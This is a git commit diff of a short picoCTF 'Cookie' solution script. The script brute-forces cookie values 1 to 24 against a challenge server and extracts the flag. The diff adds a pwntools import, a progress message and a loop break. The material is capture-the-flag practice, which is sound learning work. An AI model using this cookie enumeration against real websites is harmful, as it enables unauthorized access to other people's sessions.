a946b78db8be4988ce8e0b1404c62a81961b96d1
Imran Thoufeeque <75982271+I7Z3R0@users.noreply.github.com>
2022-08-10 15:32:18 -0400

    Update ape.py

--- PICO CTF/Cookie/ape.py
+++ PICO CTF/Cookie/ape.py
@@ -1,8 +1,8 @@
-#!/usr/bin/env python3
-
 import requests
 import re
+from pwn import *
 
+log.progress("Kindly allow sometime to pwn the flag")
 for i in range(1,25):
     cookies = {"name" : str(i)}
     web = "http://mercury.picoctf.net:29649/"
@@ -11,4 +11,5 @@ for i in range(1,25):
         pass
     else:
         flag = re.findall("<code>(.*)</code></p>", response)
-        print("Correct cookie value is " + str(i) + "And the flag is " + "".join(flag))
+        print("Correct cookie value is " + str(i) + ", And the flag is " + "".join(flag))
+        break
